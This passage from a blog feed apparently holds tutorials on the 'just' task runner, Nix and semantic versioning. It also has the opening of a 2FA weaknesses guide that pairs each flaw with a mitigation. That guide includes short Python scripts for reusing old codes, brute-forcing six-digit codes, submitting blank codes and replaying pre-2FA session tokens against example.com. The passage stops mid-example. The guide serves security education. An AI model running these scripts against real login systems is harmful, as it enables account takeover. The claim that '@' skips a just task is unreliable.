project</span><br></pre></td></tr></table></figure><h3 id="Conditionals-and-Loops"><a href="#Conditionals-and-Loops" class="headerlink" title="Conditionals and Loops"></a>Conditionals and Loops</h3><p><code>just</code> supports basic conditionals and loops, which you can use to add more logic to your tasks.</p><h4 id="Conditional-Example"><a href="#Conditional-Example" class="headerlink" title="Conditional Example:"></a>Conditional Example:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Task: Check environment</span><br><span class="line">check_env:</span><br><span class="line">    if test -f &quot;dev.env&quot;; then</span><br><span class="line">        echo &quot;Development environment detected&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Production environment detected&quot;</span><br><span class="line">    fi</span><br></pre></td></tr></table></figure><p>This example checks if the <code>dev.env</code> file exists and prints a message based on whether it’s found.</p><h4 id="Loop-Example"><a href="#Loop-Example" class="headerlink" title="Loop Example:"></a>Loop Example:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Task: Print numbers from 1 to 5</span><br><span class="line">print_numbers:</span><br><span class="line">    for i in &#123;1..5&#125;; do</span><br><span class="line">        echo &quot;Number: $i&quot;</span><br><span class="line">    done</span><br></pre></td></tr></table></figure><h3 id="Using-Just-for-Python-Projects"><a href="#Using-Just-for-Python-Projects" class="headerlink" title="Using Just for Python Projects"></a>Using Just for Python Projects</h3><p>If you have a Python project, you can use <code>just</code> to manage common tasks like running tests, installing dependencies, or running your application.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Task: Install dependencies</span><br><span class="line">install:</span><br><span class="line">    pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line"># Task: Run the Python script</span><br><span class="line">run:</span><br><span class="line">    python3 app.py</span><br><span class="line"></span><br><span class="line"># Task: Run unit tests</span><br><span class="line">test:</span><br><span class="line">    pytest tests/</span><br></pre></td></tr></table></figure><p>Now, you can run these tasks simply by typing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">just install    # Install dependencies</span><br><span class="line">just run        # Run the Python script</span><br><span class="line">just test       # Run unit tests</span><br></pre></td></tr></table></figure><h3 id="Advanced-Usage-Skipping-Tasks"><a href="#Advanced-Usage-Skipping-Tasks" class="headerlink" title="Advanced Usage: Skipping Tasks"></a>Advanced Usage: Skipping Tasks</h3><p>You can skip a task’s execution by prefixing its name with <code>@</code>. This is useful when you want to skip a task in a chain.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just @install</span><br></pre></td></tr></table></figure><p>This will skip the <code>install</code> task and proceed with the next task.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;What-is-just&quot;&gt;&lt;a href=&quot;#What-is-just&quot; class=&quot;headerlink&quot; title=&quot;What is just?&quot;&gt;&lt;/a&gt;What is &lt;code&gt;just&lt;/code&gt;?&lt;/h3&gt;&lt;p&gt;&lt;c</summary>
      
    
    
    
    
    <category term="just" scheme="http://iaaaannn0.com/tags/just/"/>
    
  </entry>
  
  <entry>
    <title>Reproducible Builds with Nix Step by Step Guide</title>
    <link href="http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/"/>
    <id>http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/</id>
    <published>2025-02-06T19:53:33.000Z</published>
    <updated>2025-02-06T19:55:35.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Nix is a powerful package manager that provides reproducible builds, isolated environments, and efficient package management. In this guide, we’ll explore how to use Nix for package management and environment setups.</p></blockquote><h2 id="1-Installing-Software-Packages-with-Nix"><a href="#1-Installing-Software-Packages-with-Nix" class="headerlink" title="1. Installing Software Packages with Nix"></a>1. Installing Software Packages with Nix</h2><p>To install software packages, Nix uses the <code>nix-env</code> command. You can install a package with the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -i &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to install the <code>hello</code> package, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -i hello</span><br></pre></td></tr></table></figure><h2 id="2-Searching-for-Packages"><a href="#2-Searching-for-Packages" class="headerlink" title="2. Searching for Packages"></a>2. Searching for Packages</h2><p>You can search for available packages in the Nix package repository using the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -qaP &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to search for packages related to <code>hello</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -qaP hello</span><br></pre></td></tr></table></figure><p>This will list all available packages matching the name <code>hello</code>.</p><h2 id="3-Listing-Installed-Packages"><a href="#3-Listing-Installed-Packages" class="headerlink" title="3. Listing Installed Packages"></a>3. Listing Installed Packages</h2><p>To see the list of installed packages, use the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -q</span><br></pre></td></tr></table></figure><p>This will display all the currently installed packages on your system.</p><h2 id="4-Upgrading-Installed-Packages"><a href="#4-Upgrading-Installed-Packages" class="headerlink" title="4. Upgrading Installed Packages"></a>4. Upgrading Installed Packages</h2><p>To upgrade all installed packages to their latest versions, run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -u</span><br></pre></td></tr></table></figure><p>If you want to upgrade a specific package, for example, <code>hello</code>, you can use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -u hello</span><br></pre></td></tr></table></figure><h2 id="5-Removing-Packages"><a href="#5-Removing-Packages" class="headerlink" title="5. Removing Packages"></a>5. Removing Packages</h2><p>If you no longer need a particular package, you can uninstall it using the <code>nix-env</code> command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -e &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to uninstall <code>hello</code>, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -e hello</span><br></pre></td></tr></table></figure><h2 id="6-Using-nix-shell-for-Isolated-Environments"><a href="#6-Using-nix-shell-for-Isolated-Environments" class="headerlink" title="6. Using nix-shell for Isolated Environments"></a>6. Using <code>nix-shell</code> for Isolated Environments</h2><p>Nix provides <code>nix-shell</code>, which allows you to enter an isolated environment with specific dependencies. You can create a <code>shell.nix</code> file to define the environment for a project. Here’s an example of a <code>shell.nix</code> file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># shell.nix</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;hello-env&quot;;</span><br><span class="line">  buildInputs = [ hello ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once the <code>shell.nix</code> file is defined, enter the environment by running:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-shell</span><br></pre></td></tr></table></figure><p>This will create a shell environment where the <code>hello</code> package and its dependencies are available.</p><h2 id="7-Nix-Configuration-Files"><a href="#7-Nix-Configuration-Files" class="headerlink" title="7. Nix Configuration Files"></a>7. Nix Configuration Files</h2><p>In Nix, you can use configuration files to manage dependencies and software installation. Here’s an example of how to define a configuration in a Nix file. You can create a configuration file (e.g., <code>default.nix</code>) that specifies the packages to be installed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># default.nix</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;my-environment&quot;;</span><br><span class="line">  buildInputs = [ vim hello ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Commenting-in-Nix-Configuration-Files"><a href="#Commenting-in-Nix-Configuration-Files" class="headerlink" title="Commenting in Nix Configuration Files"></a>Commenting in Nix Configuration Files</h3><p>Nix allows you to add comments to your configuration files for clarity. Use <code>#</code> to add a comment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># This is a simple Nix configuration file</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;my-environment&quot;;</span><br><span class="line">  buildInputs = [ vim hello ]; # Install vim and hello package</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this example:</p><ul><li><code>with import &lt;nixpkgs&gt;</code>: Imports the Nix Packages collection.</li><li><code>stdenv.mkDerivation</code>: Creates a custom environment.</li><li><code>buildInputs</code>: Specifies which packages (like <code>vim</code> and <code>hello</code>) to include in the environment.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Nix is a powerful package manager that provides reproducible builds, isolated environments, and efficient package management</summary>
      
    
    
    
    
    <category term="nix" scheme="http://iaaaannn0.com/tags/nix/"/>
    
  </entry>
  
  <entry>
    <title>Semantic Versioning for GitHub Releases</title>
    <link href="http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/"/>
    <id>http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/</id>
    <published>2025-02-05T19:23:00.000Z</published>
    <updated>2025-02-05T19:25:10.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="What-is-Semantic-Versioning-SemVer"><a href="#What-is-Semantic-Versioning-SemVer" class="headerlink" title="What is Semantic Versioning (SemVer)?"></a><strong>What is Semantic Versioning (SemVer)?</strong></h2><p>Semantic Versioning (SemVer) is a widely adopted standard for naming software versions. It follows this format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAJOR.MINOR.PATCH</span><br></pre></td></tr></table></figure><p>For example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1.0.0</span><br></pre></td></tr></table></figure><p>Each part of the version number has a specific meaning:</p><ul><li><strong>MAJOR:</strong> Significant changes that break backward compatibility.</li><li><strong>MINOR:</strong> New features that are backward compatible.</li><li><strong>PATCH:</strong> Bug fixes and small improvements that do not change functionality.</li></ul><h3 id="Examples-of-Stable-Releases"><a href="#Examples-of-Stable-Releases" class="headerlink" title="Examples of Stable Releases:"></a><strong>Examples of Stable Releases:</strong></h3><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0</code></td><td>First stable release</td></tr><tr><td><code>v1.1.0</code></td><td>Adds new features, backward compatible</td></tr><tr><td><code>v1.1.1</code></td><td>Bug fix release, backward compatible</td></tr><tr><td><code>v2.0.0</code></td><td>Breaking changes introduced</td></tr></tbody></table><h2 id="Pre-release-Versions-Testing-Versions"><a href="#Pre-release-Versions-Testing-Versions" class="headerlink" title="Pre-release Versions (Testing Versions)"></a><strong>Pre-release Versions (Testing Versions)</strong></h2><p>Before an official stable release, you may want to publish a <strong>pre-release version</strong> for testing purposes. These versions contain experimental features or improvements that need validation.</p><h3 id="Naming-Format-for-Pre-release-Versions"><a href="#Naming-Format-for-Pre-release-Versions" class="headerlink" title="Naming Format for Pre-release Versions:"></a><strong>Naming Format for Pre-release Versions:</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAJOR.MINOR.PATCH-identifier.version</span><br></pre></td></tr></table></figure><table><thead><tr><th>Identifier</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-alpha</code></td><td>Internal testing version (unstable)</td></tr><tr><td><code>-beta</code></td><td>Public testing version (feature-complete but may contain bugs)</td></tr><tr><td><code>-rc</code></td><td>Release Candidate (nearly stable, final testing)</td></tr><tr><td><code>-snapshot</code></td><td>Nightly or in-development snapshot</td></tr></tbody></table><h3 id="Examples-of-Pre-release-Versions"><a href="#Examples-of-Pre-release-Versions" class="headerlink" title="Examples of Pre-release Versions:"></a><strong>Examples of Pre-release Versions:</strong></h3><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0-alpha.1</code></td><td>First alpha version (internal testing)</td></tr><tr><td><code>v1.0.0-beta.2</code></td><td>Second beta version (public testing)</td></tr><tr><td><code>v1.0.0-rc.1</code></td><td>First release candidate</td></tr><tr><td><code>v1.0.0</code></td><td>Final stable version</td></tr></tbody></table><hr><h2 id="Other-Naming-Conventions"><a href="#Other-Naming-Conventions" class="headerlink" title="Other Naming Conventions"></a><strong>Other Naming Conventions</strong></h2><p>In some cases, you might want to add metadata or build information to the version number.</p><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0+build20240205</code></td><td>Includes build metadata (doesn’t affect version sorting)</td></tr><tr><td><code>v1.0.0-dev</code></td><td>Development version</td></tr><tr><td><code>v1.0.0-nightly</code></td><td>Nightly build version</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;What-is-Semantic-Versioning-SemVer&quot;&gt;&lt;a href=&quot;#What-is-Semantic-Versioning-SemVer&quot; class=&quot;headerlink&quot; title=&quot;What is Semantic Version</summary>
      
    
    
    
    
    <category term="releases" scheme="http://iaaaannn0.com/tags/releases/"/>
    
  </entry>
  
  <entry>
    <title>From Setup to Exploitation - A Comprehensive Guide to 2FA Weaknesses</title>
    <link href="http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/"/>
    <id>http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/</id>
    <published>2025-02-05T12:17:16.000Z</published>
    <updated>2025-02-05T12:30:17.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description-of-2FA-Vulnerabilities"><a href="#Description-of-2FA-Vulnerabilities" class="headerlink" title="Description of 2FA Vulnerabilities"></a>Description of 2FA Vulnerabilities</h2><p>Two-Factor Authentication (2FA) is a critical security feature used to provide an additional layer of protection beyond a username and password. However, vulnerabilities in the implementation, setup, or management of 2FA can undermine its effectiveness.</p><h3 id="2FA-Setup-Implementation"><a href="#2FA-Setup-Implementation" class="headerlink" title="2FA Setup&#x2F;Implementation"></a>2FA Setup&#x2F;Implementation</h3><h4 id="1-2FA-Secret-Cannot-Be-Rotated"><a href="#1-2FA-Secret-Cannot-Be-Rotated" class="headerlink" title="1. 2FA Secret Cannot Be Rotated"></a><strong>1. 2FA Secret Cannot Be Rotated</strong></h4><p>In many systems, once a 2FA secret (e.g., a key or QR code) is generated, it cannot be rotated or updated. This becomes a problem if the secret is ever exposed, as it leaves the account permanently vulnerable.</p><p><strong>Impact:</strong> If the 2FA secret is compromised, the attacker gains long-term access without the user being able to recover.</p><p><strong>Solution:</strong> Always provide users with the option to securely rotate their 2FA secret. Implement a mechanism to invalidate old secrets and ensure the new one is immediately effective.</p><hr><h4 id="2-2FA-Secret-Remains-Obtainable-After-2FA-Is-Enabled"><a href="#2-2FA-Secret-Remains-Obtainable-After-2FA-Is-Enabled" class="headerlink" title="2. 2FA Secret Remains Obtainable After 2FA Is Enabled"></a><strong>2. 2FA Secret Remains Obtainable After 2FA Is Enabled</strong></h4><p>A common issue is leaving the 2FA secret accessible after the initial setup. If a user’s QR code or secret key is stored insecurely or remains visible in the user interface, attackers can retrieve it even after 2FA has been enabled.</p><p><strong>Impact:</strong> This allows an attacker to bypass 2FA protections by using the exposed secret.</p><p><strong>Solution:</strong> Remove or obfuscate the 2FA secret immediately after it is set up. Ensure secrets are never logged, stored in plaintext, or exposed in server responses.</p><hr><h4 id="3-Logic-Bugs-in-2FA-Setup"><a href="#3-Logic-Bugs-in-2FA-Setup" class="headerlink" title="3. Logic Bugs in 2FA Setup"></a><strong>3. Logic Bugs in 2FA Setup</strong></h4><p>Poorly designed logic in the 2FA setup process can cause unintended consequences, such as locking users out of their accounts or corrupting existing authentication settings. For example, systems that allow enabling 2FA without proper state validation can create inconsistencies.</p><p><strong>Impact:</strong> Logic errors can cause account damage or allow attackers to exploit weak points in the setup process.</p><p><strong>Solution:</strong> Thoroughly test the 2FA setup process for edge cases, such as interrupted sessions, invalid requests, and duplicated operations. Use state validation mechanisms to prevent unintended behavior.</p><hr><h4 id="4-Previously-Created-Sessions-Remain-Valid-After-2FA-Activation"><a href="#4-Previously-Created-Sessions-Remain-Valid-After-2FA-Activation" class="headerlink" title="4. Previously Created Sessions Remain Valid After 2FA Activation"></a><strong>4. Previously Created Sessions Remain Valid After 2FA Activation</strong></h4><p>When a user enables 2FA, all active sessions should be invalidated. However, many systems fail to do this, leaving old sessions operational. This can allow attackers with access to an existing session to bypass the new 2FA requirement.</p><p><strong>Impact:</strong> Attackers with access to an active session can continue to operate without being prompted for 2FA.</p><p><strong>Solution:</strong> Automatically terminate all active sessions when 2FA is enabled. Notify users of the session termination and give them control over managing active sessions.</p><hr><h4 id="5-Enabling-2FA-Without-Email-Verification"><a href="#5-Enabling-2FA-Without-Email-Verification" class="headerlink" title="5. Enabling 2FA Without Email Verification"></a><strong>5. Enabling 2FA Without Email Verification</strong></h4><p>Some systems allow users to enable 2FA without verifying their email or identity. This is problematic because attackers who have gained access to an account could enable and misuse 2FA, making it difficult for the legitimate user to regain control.</p><p><strong>Impact:</strong> Attackers can establish control over an account’s 2FA without proper verification, locking out the legitimate user.</p><p><strong>Solution:</strong> Enforce email or identity verification before allowing users to enable 2FA. This ensures only authorized users can modify security settings.</p><hr><h4 id="6-IDOR-Vulnerabilities-Leading-to-Account-Takeover"><a href="#6-IDOR-Vulnerabilities-Leading-to-Account-Takeover" class="headerlink" title="6. IDOR Vulnerabilities Leading to Account Takeover"></a><strong>6. IDOR Vulnerabilities Leading to Account Takeover</strong></h4><p>Insecure Direct Object References (IDOR) in 2FA-related endpoints can be exploited to modify or access another user’s 2FA settings. For example, attackers could manipulate API requests to enable or disable 2FA for other accounts.</p><p><strong>Impact:</strong> Attackers can take over accounts by altering 2FA settings without authorization.</p><p><strong>Solution:</strong> Implement robust access control mechanisms for all 2FA-related API endpoints. Use user-specific identifiers bound to sessions and validate all requests server-side.</p><h3 id="2FA-Bypass-Vulnerabilities-Detailed-Steps-and-Examples"><a href="#2FA-Bypass-Vulnerabilities-Detailed-Steps-and-Examples" class="headerlink" title="2FA Bypass Vulnerabilities: Detailed Steps and Examples"></a>2FA Bypass Vulnerabilities: Detailed Steps and Examples</h3><h4 id="1-2FA-Code-Leakage-in-Responses"><a href="#1-2FA-Code-Leakage-in-Responses" class="headerlink" title="1. 2FA Code Leakage in Responses"></a><strong>1. 2FA Code Leakage in Responses</strong></h4><p>If 2FA codes are sent in responses from the server to the client, attackers can intercept them using tools like proxies (e.g., Burp Suite) or by monitoring logs.</p><p><strong>Exploit Steps:</strong></p><ol><li>Initiate a 2FA login request.</li><li>Use a proxy to inspect the server’s HTTP response.</li><li>Look for fields containing the current 2FA code in the JSON or HTML response.</li></ol><p><strong>Example Response:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;status&quot;: &quot;success&quot;,</span><br><span class="line">  &quot;2fa_code&quot;: &quot;123456&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;Verification code sent to your device.&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Attack:</strong> By capturing the <code>2fa_code</code> field, an attacker can bypass the need for real-time code input.</p><p><strong>Mitigation:</strong></p><ul><li>Never send 2FA codes or sensitive information in server responses.</li><li>Use one-time codes that are validated server-side without revealing them to the client.</li></ul><h4 id="2-Reusing-Old-2FA-Codes"><a href="#2-Reusing-Old-2FA-Codes" class="headerlink" title="2. Reusing Old 2FA Codes"></a><strong>2. Reusing Old 2FA Codes</strong></h4><p>If old 2FA codes are not invalidated after generating a new one, attackers can reuse previously intercepted codes.</p><p><strong>Exploit Steps:</strong></p><ol><li>Capture a valid 2FA code during a login session.</li><li>Generate a new 2FA code (e.g., by triggering another login attempt).</li><li>Use the previously captured code instead of the latest one.</li></ol><p><strong>Example Exploit Code:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Simulate login</span><br><span class="line">login_payload = &#123;&quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;</span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.post(&quot;https://example.com/login&quot;, data=login_payload)</span><br><span class="line"></span><br><span class="line"># Use old code</span><br><span class="line">bypass_payload = &#123;&quot;2fa_code&quot;: &quot;123456&quot;&#125;  # Old captured code</span><br><span class="line">bypass_response = session.post(&quot;https://example.com/verify-2fa&quot;, data=bypass_payload)</span><br><span class="line"></span><br><span class="line">print(bypass_response.status_code)  # Should return 200 if bypassed</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Immediately invalidate old codes when new codes are generated.</li><li>Use nonce-based validation to ensure that only the most recent code is valid.</li></ul><h4 id="3-Lack-of-Rate-Limiting-Brute-Force-Attack"><a href="#3-Lack-of-Rate-Limiting-Brute-Force-Attack" class="headerlink" title="3. Lack of Rate-Limiting (Brute-Force Attack)"></a><strong>3. Lack of Rate-Limiting (Brute-Force Attack)</strong></h4><p>Without rate limits, attackers can brute-force 2FA codes by rapidly trying all possible combinations (e.g., <code>000000</code> to <code>999999</code>).</p><p><strong>Exploit Steps:</strong></p><ol><li>Write a script to automate code guessing.</li><li>Continuously send requests until the correct code is found.</li></ol><p><strong>Example Attack Script:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;https://example.com/verify-2fa&quot;</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line"></span><br><span class="line">for code in range(1000000):  # 6-digit codes</span><br><span class="line">    payload = &#123;&quot;2fa_code&quot;: f&quot;&#123;code:06&#125;&quot;&#125;</span><br><span class="line">    response = requests.post(url, data=payload, headers=headers)</span><br><span class="line"></span><br><span class="line">    if response.status_code == 200:  # Success</span><br><span class="line">        print(f&quot;Code found: &#123;code:06&#125;&quot;)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Enforce rate-limiting (e.g., 5 attempts per minute per IP).</li><li>Introduce account lockouts or CAPTCHA after repeated failures.</li></ul><h4 id="4-Bypassing-2FA-with-Null-or-Blank-Values"><a href="#4-Bypassing-2FA-with-Null-or-Blank-Values" class="headerlink" title="4. Bypassing 2FA with Null or Blank Values"></a><strong>4. Bypassing 2FA with Null or Blank Values</strong></h4><p>Some systems improperly validate 2FA codes, allowing null or blank values to bypass authentication.</p><p><strong>Exploit Steps:</strong></p><ol><li>Attempt to submit an empty or invalid <code>2fa_code</code> field.</li><li>Check if authentication succeeds despite no valid code.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#123;&quot;2fa_code&quot;: &quot;&quot;&#125;</span><br><span class="line">response = requests.post(&quot;https://example.com/verify-2fa&quot;, data=payload)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates successful bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Validate input server-side to reject null, empty, or default values.</li><li>Use strict validation checks for format and length (e.g., exactly 6 digits).</li></ul><h4 id="5-Misconfigured-Session-Permissions"><a href="#5-Misconfigured-Session-Permissions" class="headerlink" title="5. Misconfigured Session Permissions"></a><strong>5. Misconfigured Session Permissions</strong></h4><p>If session management is not properly configured, attackers may bypass 2FA by directly accessing authenticated endpoints without completing 2FA verification.</p><p><strong>Exploit Steps:</strong></p><ol><li>Intercept the session token after login but before 2FA verification.</li><li>Use the session token to access authenticated endpoints.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Assume session token is captured before 2FA</span><br><span class="line">session_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;</span><br><span class="line"></span><br><span class="line"># Access a protected endpoint</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;session_token&#125;&quot;&#125;</span><br><span class="line">response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Mark sessions as “partial” until 2FA is completed.</li><li>Restrict access to sensitive endpoints until full authentication is confirmed.</li></ul><h4 id="6-Referrer-Check-Bypass-with-Direct-Requests"><a href="#6-Referrer-Check-Bypass-with-Direct-Requests" class="headerlink" title="6. Referrer Check Bypass with Direct Requests"></a><strong>6. Referrer Check Bypass with Direct Requests</strong></h4><p>If 2FA verification relies on referrer headers, attackers can bypass these checks by crafting direct requests.</p><p><strong>Exploit Steps:</strong></p><ol><li>Inspect network traffic for referrer-based verification.</li><li>Send a crafted HTTP request without the expected referrer.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;&quot;Referer&quot;: &quot;https://example.com/legitimate-page&quot;&#125;</span><br><span class="line">response = requests.post(&quot;https://example.com/verify-2fa&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # Should bypass referrer-based restrictions</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Avoid relying solely on referrer headers for verification.</li><li>Use session-bound tokens or other mechanisms to validate request authenticity.</li></ul><h4 id="7-Using-OAuth-for-2FA-Bypass"><a href="#7-Using-OAuth-for-2FA-Bypass" class="headerlink" title="7. Using OAuth for 2FA Bypass"></a><strong>7. Using OAuth for 2FA Bypass</strong></h4><p>If 2FA integration with OAuth is poorly configured, attackers can exploit token exchange mechanisms to bypass 2FA.</p><p><strong>Exploit Steps:</strong></p><ol><li>Exploit a misconfigured OAuth endpoint to request access tokens without completing 2FA.</li><li>Use the token to authenticate directly.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td 